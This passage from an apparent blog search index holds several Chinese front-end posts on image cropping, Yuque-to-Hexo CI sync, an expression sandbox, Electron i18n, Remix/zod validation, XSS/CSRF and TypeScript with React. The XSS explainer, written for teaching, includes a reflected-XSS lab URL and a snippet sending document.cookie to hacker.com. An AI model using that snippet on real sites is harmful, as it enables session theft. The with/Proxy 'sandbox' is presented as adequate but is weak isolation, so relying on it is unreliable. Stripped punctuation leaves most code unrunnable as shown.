但是在我们业务的场景下，同时会存在两个裁切框分别用来裁切「网页端」和「移动端」，用的都是同一个图片，也就是说替换图片会同时替换「网页端」和「移动端」的图片。这就导致了替换图片后，只有当前激活的 tab 下的 cropper 调用 getCroppedCanvas 才能获取到替换图片后的数据，没有激活的 tab 下还是获取旧图片的数据。 复现路径： 除非在提交前，手动切换到移动端的 tab，不然该问题会一直存在，这是 cropperjs 内部实现的问题，我们不能要求用户多这么一个无意义的步骤，因此我们自己实现 「getCroppedCanvas」方法，不用 cropperjs 暴露的方法 // 使用 canvas 裁切图片export const cropImage = (source: string, options: Options) = const width, height, x, y = options; const canvas = document.createElement(canvas); const context = canvas.getContext(2d)!; const image = new Image(); image.src = source; image.crossOrigin = anonymous; return new PromiseHTMLCanvasElement((resolve) = image.onload = () = const [px, py, pw, ph] = [ inRange(x, 0, image.width) ? x : 0, inRange(y, 0, image.height) ? y : 0, inRange(width, 0, image.width) ? width : image.width, inRange(height, 0, image.height) ? height : image.height, ].map((param) = Math.floor(normalizeDecimalNumber(param))); canvas.width = pw; canvas.height = ph; context.imageSmoothingEnabled = true; context.imageSmoothingQuality = low; context.drawImage(image, px, py, pw, ph, 0, 0, pw, ph); context.restore(); resolve(canvas); ; );;"},{"title":"语雀同步到 Github Hexo","path":"/2023/01/31/5e91c1995fd8/","content":"背景我的博客都是用 Hexo 在本地写完，提交个 commit 到 Github，触发 Github Action 自动部署到 Github Page 上。除了用 Vscode 写 Markdown 有点难受外，其它地方还好，至于为什么一定要用 Hexo + Github 的组合，白嫖 Github 的服务器它不香吗？ 但是，最近体验了下语雀，发现他的文本编辑器还是很不错的，写文档很是丝滑，正好在 Github 上发现了个项目 - https://github.com/x-cold/yuque-hexo，可以将语雀的文章同步到 Hexo 中，是时候改变下博客写作流程了。下面就记录了整个迁移过程。 安装及配置 yuque-hexo在 hexo 项目的根目录中执行以下命令，安装 yuque-hexo： yarn add yuque-hexo -D 1. 新增配置： yuqueConfig: postPath: source/_posts/yuque, cachePath: yuque.json, mdNameFormat: title, adapter: hexo, concurrency: 5, baseUrl: https://www.yuque.com/api/v2, login: bijinfeng-fyjgs, repo: blog, onlyPublished: true, onlyPublic: false, imgCdn: concurrency: 0, imageBed: upyun, enabled: true, bucket: xxxx, prefixKey: yuque yuqueConfig 中每个字段的作用在 yuque-hexo 的 README 中都有说明，我这里挑几个重点的说下： login - 个人路径 repo - 知识库路径 2. 新增脚本这些脚本主要用在后面的 Github Action 中，当然也方便本地调试使用 scripts: clean:yuque: yuque-hexo clean, sync: yuque-hexo sync, reset: npm run clean:yuque npm run sync 配置 Github Action在修改 Github Action 配置文件前，我们先需要获取几个 Token： YUQUE_TOKEN 新增或使用现有的 Token，Token 给个读取权限就行了 SECRET_ID SECRET_KEY 图床相关的密钥，我用的是又拍云，需要操作员的账号和密码（密码忘了的话，点击编辑按钮，重新生成个） 在 Github 项目的 Setting 中新增三个环境变量 上面的变量都准备好后，来到 hexo 项目的 .githubworkflows 目录，新增个 deploy.yml 文件: name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: environment: github-pages env: yuque_token: $ secrets.YUQUE_TOKEN secret_id: $ secrets.SECRET_ID secret_key: $ secrets.SECRET_KEY runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Sync Yuque run: YUQUE_TOKEN=$ env.yuque_token SECRET_ID=$ env.secret_id SECRET_KEY=$ env.secret_key yarn sync - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $ secrets.ACCESS_TOKEN publish_dir: ./public 或者你的项目中原本就有 Action 的配置，现在只需要增加 yuque-hexo 的相关配置就行： 消费上面设置的环境变量 注意 environment 字段必须和你在 Github Setting 中配置的 Environments 字段对应上 environment: github-pages env: yuque_token: $ secrets.YUQUE_TOKEN secret_id: $ secrets.SECRET_ID secret_key: $ secrets.SECRET_KEY 在运行 hexo generate 之前，先同步语雀的文章 - name: Sync Yuque run: YUQUE_TOKEN=$ env.yuque_token SECRET_ID=$ env.secret_id SECRET_KEY=$ env.secret_key yarn sync 到这里 yueque-hexo 的配置工作就完成了，保存，提交 commit 到 GitHub 上触发 Action，如果一切顺利的话语雀的文章就会同步过来。 主动同步上面的动作完成后，我们虽然能够同步语雀的文章，但是我们在语雀写完文章后，还需要到 github 上手动触发下 Action，体验还是不够完美，为了解决这个问题，我们有两个方案： 定义任务给 Action 添加个定时任务，在每天的 2:00 同步一次语雀 on: schedule: - cron: 0 2 * * * webhook 在语雀写完文章后，自动触发个 webhook，启动 Github Action 同步文章 使用 API 远程触发 Github Action 现在 Action 只能在提交 commit 后触发，新增个配置，让 Action 支持被 api 触发： on: push: branches: - master # 允许外部仓库事件触发 repository_dispatch: types: # 这里的值需要和下文的云函数的event_type保持一致 - webhook 访问链接页面 https://github.com/settings/tokens/new 申请一个 Token，需要勾选 repo 权限。 API 调用格式 curl -X POST https://api.github.com/repos/:owner/:repo/dispatches \\ -H Accept: application/vnd.github.everest-preview+json \\ -H Authorization: token TRIGGER_TOKEN \\ --data event_type: TRIGGER_EVENT 其中，owner 是用户名，repo 是仓库名， TRIGGER_TOKEN 是上面申请的 Token 凭证，TRIGGER_EVENT 是自定义的事件名。 若是语雀支持自定义 webhook 格式，那么本文到这里就要结束了，可惜天公不作美，语雀只支持配置个接口 URL。那么我们就需要借助云函数来倒一手了，代理后的调用路径变成：语雀 webhook - 云函数 - gtihub api。 腾讯云函数 我这里使用的是腾讯云函数，其它云服务商的云函数只能自己探索了。 新建个云函数，我们只要做个接口转发，不用那么麻烦就不用模板了（作为前端 er 当然首选 node）： 下面编辑云函数: use strict;const request = require(request);exports.main_handler = async (event, context) = const res = await new Promise((resolve, reject) = request( url: https://api.github.com/repos/:owner/:repo/dispatches, method: POST, json: true, headers: User-Agent: curl/7.52.1, Content-Type: application/json, Authorization: token xxxxx, Accept: application/vnd.github.everest-preview+json, , body: event_type: webhook , , function (error, response, body) if (response.status_code == 204) resolve(response); else reject(error); ); ); return res;; 触发器设置，触发方式选择「API 网关触发」，其它默认： 创建成功后，腾讯云会提供个公网访问路径，将其配置到知识库的「消息推送」设置中： AirCode腾讯云 serverless 并不是免费的，前三个月有免费额度,之后收费，既然要白嫖就白嫖到底。 推荐使用 https://aircode.io/，每月的免费额度如下，绝对够你使用了： 使用也很简单，新建个项目后，添加三个环境变量 填入以下代码： // @see https://docs.aircode.io/guide/functions/const aircode = require(aircode);const axios = require(axios);module.exports = async function (params, context) const res = await axios( url: `https://api.github.com/repos/$process.env.owner/$process.env.repo/dispatches`, method: post, headers: User-Agent: curl/7.52.1, Content-Type: application/json, Authorization: `token $process.env.token`, Accept: application/vnd.github.everest-preview+json, , data: event_type: webhook , ); if (res.status) return 回调请求成功; return res;; 点击 deploy按钮发布后，会得到云函数的公网访问路径，填到语雀的知识库配置中即可。 发布文章现在，在发布和更新文章后，即可触发 Action。 注意事项 不要开启自动发布，否则无法触发 webhook"},{"title":"JS - 字符串函数表达式","path":"/2023/01/29/0c6c2b4b35c0/","content":"最近在做一个需要，需要实现一个字符串形式的“函数表达式”，以双括号“{{…}}”为语法特征。例如： title：formData.x.y === us ? 美元:人民币 并且函数表达式内置了一些关键词： $self - 代表当前字段实例，用来获取当前字段的值和 schema 配置 $values - 代表整个表单数据 $form - 代表当前 Form 实例，可以用来触发表单校验等操作 $deps - 获取 dependencies 中依赖项的值，和 dependencies 顺序一致 $fetch - 使用封装的 request 方法，发送 http 请求 使用了关键词的表达式如下： select_options: $self.select_options.map(item = ( ...item, disabled: $deps[0].map(it = it.bank_card_usage).includes(item.value) )); 函数表达式可能由后端下发或者用户输入，因此为防止 XSS 注入，函数表达式的作用域需要限制下。 实现new Function 语法 引用自：深入 JS new Function 语法 « 张鑫旭-鑫空间-鑫生活 实现函数表达式之前，我们先复习下 new Function 语法： let func = new Function([arg1, arg2, ...argN], functionBody); 最后一个参数一定是函数体，其余参数都作为传给函数体的参数。 例如： let sum = new Function(a, b, return a + b);console.log(sum(1, 2)); // 结果是 3 平常进行 JS 或者 Node.js 开发的时候，我们是没有任何理由使用 new Function 构造函数的，因为没必要，直接使用 function 或者 () {} 箭头函数写法就好了。 那是不是表示 new Function 语法是个鸡肋特性呢？ 不！绝不是！ new Function 语法有个特别厉害的特性，使其成为 JavaScript 这门语言中无可替代的重要角色。。 什么特性呢？ 那就是函数体的数据格式是字符串，这可是个不得了的东西啊！ 解析函数表达式利用 new Function 的语法特性，我们就可以将字符串变成可执行的代码： const compile = (expression: string, scope = ) = return new Function($root, `with($root) return ($expression); `)( scope );; compile 函数有两个参数，第一个参数为要执行的字符串表达式，第二个参数为执行时的作用域，将 $self 等内置关键词传入 scope 供函数执行时调用。 compile 实现时使用了 with 关键词，帮助我们简化代码，如果不使用 with 关键词，scope 里所有的元素都需要依次传入 new Function 中： const compile = (expression, scope = ) = const keys = Object.keys(scope); const values = keys.map((key) = scope[key]); return new Function(...keys, `return ($expression);`)(...values);; 不过，with 在性能和语义方面都有些问题（具体问题见：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/with），至于用不用，自己考虑吧 限制作用域现在字符串得以执行了，接下来需要解决的就是函数的作用域问题了。 由 Function 构造函数创建的函数不会创建当前环境的闭包，它们总是被创建于全局环境，因此在运行时它们只能访问全局变量和自己的局部变量，不能访问它们被 Function 构造函数创建时所在的作用域的变量。 var x = 10;function createFunction1() var x = 20; return new Function(return x;); // 这里的 x 指向最上面全局作用域内的 xfunction createFunction2() var x = 20; function f() return x; // 这里的 x 指向上方本地作用域内的 x return f;var f1 = createFunction1();console.log(f1()); // 10var f2 = createFunction2();console.log(f2()); // 20 因此，如果仅仅是限制表达式访问创建时所在的作用域的变量，new Function 就足够了，如果还想要限制访问全局作用域，那么就要实现一个沙箱了。 沙箱 引用自：浅析 JavaScript 沙箱机制 什么是沙箱？ 在计算机安全中，沙箱（Sandbox）是一种用于隔离正在运行程序的安全机制，通常用于执行未经测试或不受信任的程序或代码，它会为待执行的程序创建一个独立的执行环境，内部程序的执行不会影响到外部程序的运行。 常见的沙箱应用场景： 执行 JSONP 请求回来的字符串时或引入不知名第三方 JS 库时，可能需要创造一个沙箱来执行这些代码。 Vue 模板表达式的计算是运行在一个沙盒之中的，在模板字符串中的表达式只能获取部分全局对象，这一点官方文档有提到，详情可参阅源码。 在线代码编辑器，如 CodeSanbox 等在线代码编辑器在执行脚本时都会将程序放置在一个沙箱中，防止程序访问影响主页面。 够用的沙箱实现： Proxy 中的 get 和 set 方法只能拦截已存在于代理对象中的属性，对于代理对象中不存在的属性这两个钩子是无感知的。因此这里我们使用 Proxy.has() 来拦截 with 代码块中的任意变量的访问，并设置一个白名单，在白名单内的变量可以正常走作用域链的访问方式，不在白名单内的变量会继续判断是否存在沙箱自行维护的上下文对象中，存在则正常访问，不存在则直接报错。 const withedCode = (code: string) = return new Function($root, `with($root) return ($code); `);;// 可访问全局作用域的白名单列表const access_white_list = [Math, Date];const Sandbox = (code: string, scope = ) = // 执行上下文对象的代理对象 const scopeProxy = new Proxy(scope, has: (target, prop) = // has 可以拦截 with 代码块中任意属性的访问 if (access_white_list.includes(prop)) // 在可访问的白名单内，可继续向上查找 return target.hasOwnProperty(prop); if (!target.hasOwnProperty(prop)) throw new Error(`Invalid expression - $prop! You can not do that!`); return true; , ); withedCode(code).call(scopeProxy, scopeProxy);;// 执行上下文对象const scope = func: (variable) = console.log(variable); , foo: foo,;// 待执行程序const code = ` Math.random() location.href = xxx func(foo)`;console.log(Sandbox(code, scope)); 最终实现版本const scope = $self: xxxx,;const ExpRE = /^\\s*\\\\([\\s\\S]*)\\\\\\s*$/;const withedCode = (code: string) = return new Function($root, `with($root) return ($code); `);;// 可访问全局作用域的白名单列表const access_white_list = [Math, Date];const Sandbox = (source: string, scope = ) = const matched = source.match(ExpRE); if (!matched) return source; const code = matched[1]; // 执行上下文对象的代理对象 const scopeProxy = new Proxy(scope, has: (target, prop) = // has 可以拦截 with 代码块中任意属性的访问 if (access_white_list.includes(prop)) // 在可访问的白名单内，可继续向上查找 return target.hasOwnProperty(prop); if (!target.hasOwnProperty(prop)) throw new Error(`Invalid expression - $prop! You can not do that!`); return true; , ); withedCode(code).call(scopeProxy, scopeProxy);;"},{"title":"Electron - 使用 i18next & react-i18next 进行国际化","path":"/2023/01/28/6c1ff1435713/","content":"tags: React i18next Electron categories: React Electron i18next 是社区中优秀的国际化框架，在 react 中广泛使用，我司的大量产品都使用 i18next 进行国际化，而 react-i18next 是 i18next 的一个扩展，提供了一些 HOC 及 hook 方便我们在 react 中使用 i18next。 由于 electron 是多进程机制，主进程和渲染进程都需要个 i18next 实例，但是多实例带来了一些问题，比如多实例的语言如何同步，文案如何集中管理？ 针对上面的两个问题，经过实践，我给出的解决方案如下： 主进程负责加载用户选择的语言和对应的文案 渲染进程通过进程通信从主进程的实例上获取初始化语言和文案初始化实例 用户在渲染进程切换语言，通过进程通信，主进程的 i18next 实例加载新语言的文案，并返回给渲染进程动态加载到渲染进程的实例中 整个流程大致如下： 主进程用户选择的系统语言保存在 electron-store 中，通过 getConfigStore方法获取上次用户选择的系统语言，默认为中文 import Store from electron-store;export interface StoreState theme: string; config: NOTES.Config;export const getConfigStore = K extends keyof NOTES.Config(key: K) = return getStoreNOTES.Config[K](`config.$key`);;export const setConfigStore = (value: PartialNOTES.Config) = const config = getAllConfigStore(); return setStore(config, ...config, ...value );; i18next-fs-backend 是 i18next 的一个扩展，允许 Node.js 从本地文件系统中加载翻译 import i18next from i18next;import i18nextBackend from i18next-fs-backend;import getConfigStore from ./store;i18next.use(i18nextBackend).init( lng: getConfigStore(lang) || zh-CN, fallbackLng: en-US, backend: loadPath: path.join(__dirname, ./i18n/lng.json), , interpolation: escapeValue: false, // react already safes from xss ,);export default i18next; i18next 实例初始化后，通过 loadLanguages加载对应语言的文案，getResourceBundle获取语言的文案，通过这两个方法，渲染进程就可以共享主进程的文案，实现文案的集中管理。 import logger from electron-log;import i18next, LngOptions from ../../utils/i18n;export const getI18nLanguages = () = return LngOptions;;export const getI18nInitResource = async () = const lng = i18next.language; const resource = await getI18nResource(lng); return lng, resource ;;export const getI18nResource = async (lng: string) = await i18next.loadLanguages(lng).catch((err) = logger.error(err); ); return i18next.getResourceBundle(lng, );;export const changeI18nLang = async (lng: string) = return new Promiseboolean((resolve) = i18next.changeLanguage(lng, (err) = if (err) logger.error(err); resolve(!err); ); );; 渲染进程invokeCommand同学 window 上挂载的变量和主进程双向通行 export const invokeCommand = T(type: string, payload = ) = return window.api.invokeT(fromRenderer, type, payload, );; 渲染进程通过 invokeCommand 调用主进程的 getI18nInitResource 方法获取初始的语言和文案完成实例的初始化。 用户切换语言时，同样通过进程通信获取新语言的文案，通过 i18next.addResourceBundle动态加载到实例中，调用 i18next.changeLanguage完成语言的切换。 import i18next, ResourceKey from i18next;import initReactI18next from react-i18next;import invokeCommand from @/commands;export const initI18next = async () = const lng, resource = await invokeCommand lng: string; resource: ResourceKey; (getI18nInitResource); return i18next.use(initReactI18next).init( lng, resources: [lng]: translation: resource, , , interpolation: escapeValue: false, , );;export const changeLanguage = async (lng: string) = if (!i18next.hasResourceBundle(lng, translation)) // 动态加载语言 const resource = await invokeCommandResourceKey(getI18nResource, lng); i18next.addResourceBundle(lng, translation, resource); return i18next.changeLanguage(lng);;export default i18next; 总结：electron 的多进程机制导致 i18next 不得不初始化出多个实例，但是我们同样可以利用进程通信，让一个实例加载文案，再同步到另一个实例，实现文案的集中管理。"},{"title":"Remix - 表单&接口入参校验","path":"/2022/04/18/51f956ea22d7/","content":"前言Remix 是 React Router 团队开发的基于 React 框架的全栈 Web 框架。既然是基于 React 框架，那么在 React 中能够使用的表单校验方案，同样适用于 Remix。 Remix 中的客户端表单校验可以采用 React 的表单校验方案，但是 Remix 作为一个全栈框架，自然是有服务端接口的，那么其入参校验也是否可以采用 node 后端通用的参数校验方案？ 下面我们就看看在前后端都是怎么校验参数的 React 表单校验框架内置校验用过 React 组件库同学应该都知道，这些组件库内部一般都会内置一个表单校验模块，例如 Ant Design ： import React from react;import Button, Checkbox, Form, Input from antd;const onFinish = (values: any) = console.log(Success:, values);;const onFinishFailed = (errorInfo: any) = console.log(Failed:, errorInfo);;const App: React.FC = () = ( Form name=basic labelCol= span: 8 wrapperCol= span: 16 style= maxWidth: 600 initialValues= remember: true onFinish=onFinish onFinishFailed=onFinishFailed autoComplete=off Form.Item label=Username name=username rules=[ required: true, message: Please input your username! ] Input / /Form.Item Form.Item label=Password name=password rules=[ required: true, message: Please input your password! ] Input.Password / /Form.Item Form.Item name=remember valuePropName=checked wrapperCol= offset: 8, span: 16 CheckboxRemember me/Checkbox /Form.Item Form.Item wrapperCol= offset: 8, span: 16 Button type=primary htmlType=submit Submit /Button /Form.Item /Form);export default App; 独立校验模块脱离组件库框架后，前端社区里还是有很多可选的校验模块，这里我只介绍两个我使用过并且绝对特别好用的库： react-hook-form从名字中就能看出，这个库主要适用于 React 框架，因此用原生开发时需要校验表单强烈推荐该库，并且其也能很好的融入现有组件库。 import useForm from react-hook-form;export default function App() const register, handleSubmit, watch, formState: errors = useForm(); const onSubmit = data = console.log(data); console.log(watch(example)); // watch input value by passing the name of it return ( /* handleSubmit will validate your inputs before invoking onSubmit */ form onSubmit=handleSubmit(onSubmit) /* register your input into the hook by invoking the register function */ input defaultValue=test ...register(example) / /* include validation with required or other standard HTML validation rules */ input ...register(exampleRequired, required: true ) / /* errors will return when field validation fails */ errors.exampleRequired spanThis field is required/span input type=submit / /form ); Zod 这个库就是个纯粹的字段校验的库了，正是因为纯粹，社区为其开发了各种适配器，可以将 zod 应用到任何需要字段校验的地方，下面看下 zod 如何应用在 React 表单校验： import z from zod;import useZorm from react-zorm;const FormSchema = z.object( name: z.string().min(1), password: z .string() .min(10) .refine((pw) = /[0-9]/.test(pw), Password must contain a number),);function Signup() const zo = useZorm(signup, FormSchema, onValidSubmit(e) e.preventDefault(); alert(Form ok! + JSON.stringify(e.data, null, 2)); , ); const disabled = zo.validation?.success === false; return ( form ref=zo.ref Name: input type=text name=zo.fields.name() className=zo.errors.name(errored) / zo.errors.name((e) = ( ErrorMessage message=e.message / )) Password: input type=password name=zo.fields.password() className=zo.errors.password(errored) / zo.errors.password((e) = ( ErrorMessage message=e.message / )) button disabled=disabled type=submit Signup! /button preValidation status: JSON.stringify(zo.validation, null, 2)/pre /form ); 服务端接口入参校验在服务端校验入参本质上就是校验字段，那么先看下其它的 node 服务端框架都是怎么校验参数的： Egg Egg 使用 egg-validate 模块进行参数校验，基本用法如下： class XXXController extends app.Controller // ... async XXX() const ctx = this; ctx.validate( system : type: string, required: false, defValue: account, desc: 系统名称, token : type: string, required: true, desc: token 验证, redirect: type: string, required: false, desc: 登录跳转 ); // if (config.throwError === false) if(ctx.paramErrors) // get error infos from `ctx.paramErrors`; let params = ctx.params; let query, body = ctx.request; // ctx.params = validater.ret.params; // ctx.request.query = validater.ret.query; // ctx.request.body = validater.ret.body; // ... ctx.body = query; // ... nestjs nestjs 主要使用第三方的 class-validator 来进行参数校验。 import Injectable, PipeTransform, ArgumentMetadata, ValidationError, HttpException, HttpStatus from @nestjs/common;import plainToClass from class-transformer;import validate from class-validator;/** * 这是一个全局的参数验证管道，基于class-transformer * 如果失败，则会抛出HttpException * 在main.ts的nestApp要将它设为全局的 */@Injectable()export class ValidationPipe implements PipeTransform async transform(value: any, metatype : ArgumentMetadata) if (!metatype || !this.toValidate(metatype)) return value; const object = plainToClass(metatype, value); const errors = await validate(object); const errorList: string[] = []; const errObjList: ValidationError[] = [...errors]; do const e = errObjList.shift(); if (!e) break; if (e.constraints) for (const item in e.constraints) errorList.push(e.constraints[item]); if (e.children) errObjList.push(...e.children); while (true); if (errorList.length 0) throw new HttpException(请求参数校验错误: + errorList.join(), HttpStatus.INTERNAL_SERVER_ERROR); return object; private toValidate(metatype: Function): boolean const types: Function[] = [String, Boolean, Number, Array, Object]; return !types.includes(metatype); 从上面的两个框架可以看出来，对于如何进行参数校验，大家的处理过程都是差不多的，都是先定义一套规则，然后用这套规则去校验字段。 那么在 remix 中校验入参自然也是这个流程，下面的示例中会使用 zod 来校验参数： import type ActionArgs from @remix-run/node;import z from zod;import parseFormAny, useZorm from react-zorm;const LoginSchema = z.object( email: z .string( required_error: Email is required ) .email( message: Invalid email ), password: z .string( required_error: Password is required ) .min(8, message: Password must be at least 8 characters ), remember: z.optional(z.boolean()),);export async function action( request : ActionArgs) const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); if (!result.success) return json( errors: result.error , status: 400 ); 前后端校验统一上面分别介绍了如何在前后端校验参数，但是如果是一个前后端分离的项目，那么前后端分开校验并且使用不同的校验方案自然是没有问题的，但是在 remix 这么一个全栈框架里使用两套校验方案，多少显得有些冗余了，而且很容易导致前后端校验不一致的问题。 那么有没有一种方案，可以只写一套校验规则，同时适用于前后端吗？ 自然是可以的，其实上文已经给出了答案，就是使用 zod 来校验参数，下面给出个完整的示例： import React from react;import IconBrandGithub, IconBrandTwitter from @tabler/icons-react;import Link, Form from @remix-run/react;import type ActionArgs from @remix-run/node;import json, redirect from @remix-run/node;import parseFormAny, useZorm from react-zorm;import z from zod;import LoginLayout from ~/components/user-layout;import FormInner from ~/components/form/form-inner;import Input from ~/components/input;import Button from ~/components/button;import Checkbox from ~/components/checkbox;import loginUser, setAuthSession from ~/modules/auth;import authCookie from ~/integrations/supabase;const LoginSchema = z.object( email: z .string( required_error: Email is required ) .email( message: Invalid email ), password: z .string( required_error: Password is required ) .min(8, message: Password must be at least 8 characters ), remember: z.optional(z.boolean()),);export async function action( request : ActionArgs) const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); let session = await authCookie.getSession(request.headers.get(Cookie)); if (!result.success) return json( errors: result.error , status: 400 ); const accessToken, refreshToken, error = await loginUser( result.data.email, result.data.password ); if (error || !accessToken || !refreshToken) return json( formError: error || Something went wrong , 403); session = setAuthSession(session, accessToken, refreshToken); return redirect(/, headers: Set-Cookie: await authCookie.commitSession(session), , );const Login: React.FC = () = const zo = useZorm(NewQuestionWizardScreen, LoginSchema); const renderFooter = () = ( div className=hr-textor/div div className=card-body div className=row div className=col Button href=# icon=IconBrandGithub className=text-github / block Login with Github /Button /div div className=col Button href=# icon=IconBrandTwitter className=text-twitter / block Login with Twitter /Button /div /div /div / ); return ( LoginLayout title=Login to your account footer=renderFooter() description= Dont have account yet? Link to=/sign-upSign up/Link / Form ref=zo.ref method=post replace FormInner label=Email address required error=zo.errors.email()?.message Input name=zo.fields.email() type=email placeholder=your@email.com / /FormInner FormInner label=Password required labelSuffix=Link to=/forgot-passwordI forgot password/Link error=zo.errors.password()?.message Input name=zo.fields.password() type=password placeholder=Your password / /FormInner div className=mb-2 Checkbox name=zo.fields.remember() Remember me on this device /Checkbox /div div className=form-footer Button buttonType=submit type=primary block Sign in /Button /div /Form /LoginLayout );;export default Login;","tags":["React","Remix"],"categories":["React","Remix"]},{"title":"XSS和CSRF的区别及防御","path":"/2022/03/08/7948600e1d25/","content":"在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。 介绍之前，先上下维基百科： XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。 CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。 XSS用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。 XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。 反射型反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面） 流程图如下： 通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—别的用户访问这个URL—恶意代码被服务器解析—传递给前端渲染实现攻击。 如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它 pikachu，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html： 可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？ 脚本被插入到 htmlh中，并且被执行。这时将这段链接 http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3Esubmit=submit# 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。 现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。 script src=http://hacker.com/hacker.js/script var img = new Image();img.src = http://hacker.com/hack.png?q= + document.cookie;document.body.append(img); 存储型存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。 反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。 比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。 流程图如下： 通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—后端不做处理传入数据库—别的用户访问页面—后端从数据库中调用XSS代码—前端渲染(执行js脚本)恶意代码实现攻击。 这里还是用 pikachu 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本： 提交后并刷新页面，这段脚本被注入到 html 中，并执行了"},{"title":"在 React 项目中优雅地使用 Typescript","path":"/2021/04/19/368700e46601/","content":"TypeScript 是 Javascript 的超集，扩展了 JavaScript 的语法，给 JavaScript 带来了静态类型支持，了解如何在 React 项目中优雅地使用 Typescript，能帮助我们写出更优雅的代码。 「优雅」的含义： 减少编写冗余的类型定义、类型标注，充分利用ts的自动类型推断，以及外部提供的类型声明。 类型安全：提供足够的类型信息来避免运行时错误，让错误暴露在开发期。这些类型信息同时能够提供代码补全、跳转到定义等功能。 组件定义函数组件import * as React from react;// 如果在tsconfig中设置了allowSyntheticDefaultImports: true// 你还可以更精练地import react：// import React from react;interface IProps // CSSProperties提供样式声明的类型信息 // 用户传入style的时候就能够获得类型检查和代码补全 style?: React.CSSProperties; // 使用@types/react提供的事件类型定义，这里指定event.target的类型是HTMLButtonElement onClick(event: React.MouseEventHTMLButtonElement): void; // ...const MyComponent: React.FCIProps = (props) = const children, ...restProps = props; return div ...restPropschildren/div; FC是FunctionComponent的缩写。 IProps无需声明children属性的类型。React.FC会自动为props添加这个属性类型。当然，如果children期望一个render prop，或者期望其他特殊的值，那么你还是要自己给children声明类型，而不是使用默认的React.ReactNode。 props无需做类型标注。 函数组件defaultProps（Deprecate）如果你需要定义defaultProps，那么不要使用React.FC，因为React.FC对defaultProps的支持不是很好： const defaultProps = who: Johny Five;type IProps = age: number typeof defaultProps;export const Greet = (props: IProps) = return div123/div ;Greet.defaultProps = defaultProps; 事实上，一个提议在函数组件中废弃defaultProps的React rfc已经被接受，所以以后还是尽量减少在函数组件上使用defaultProps，使用ES6原生的参数解构+默认参数特性就已经能够满足需要： const TestFunction: FunctionComponentProps = ( foo = bar ) = divfoo/div 类组件interface IProps message: string;interface IState count: number;export class MyComponent extends React.ComponentIProps, IState state: IState = // duplicate IState annotation for better type inference count: 0 ; render() return ( div this.props.message this.state.count /div ); 如果你通过声明state属性来初始化state，那么你需要为这个属性增加IState类型标注。虽然这与前面的React.ComponentIProps, IState有重复的嫌疑，但是这两者实际上是不同的： React.ComponentIProps, IState只是标注了基类的state属性类型。 而当你在子类声明state时，你可以为state标注一个【IState的子类型】作为override。这样，this.state会以子类中的state属性声明作为类型信息的来源。 建议使用函数组件。 可渲染节点类型可渲染节点就是：可以直接被组件渲染函数返回的值。 与可渲染节点有关的类型定义如下（摘录自[@typesreact](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187）： type ReactText = string | number;type ReactChild = ReactElement | ReactText;interface ReactNodeArray extends ArrayReactNode type ReactFragment = | ReactNodeArray;type ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined; 组件类型 React.FCProps（即 React.FunctionComponentProps） React.ComponentProps, State React.ComponentTypeProps（即ComponentClassP | FunctionComponentP） 在写HOC的时候经常用到。 const withState = P extends WrappedComponentProps( WrappedComponent: React.ComponentTypeP,) = ... 获取并扩展原生元素的props类型比如，以下例子获取并扩展了button的props类型： export const PrimaryButton = ( props: Props React.HTMLPropsHTMLButtonElement) = Button size=ButtonSizes.default ...props /; PrimaryButton能够接受所有原生button所接受的props。关键在于React.HTMLProps。 获取并扩展第三方组件的props类型import Button from library; // but doesnt export ButtonProps! oh no!type ButtonProps = React.ComponentPropstypeof Button; // no problem! grab your own!type AlertButtonProps = OmitButtonProps, onClick; // modifyconst AlertButton: React.FCAlertButtonProps = props = ( Button onClick=() = alert(hello) ...props /); 事件类型@types/react提供了各种事件的类型，比如以下是使用React.FormEvent的例子： class App 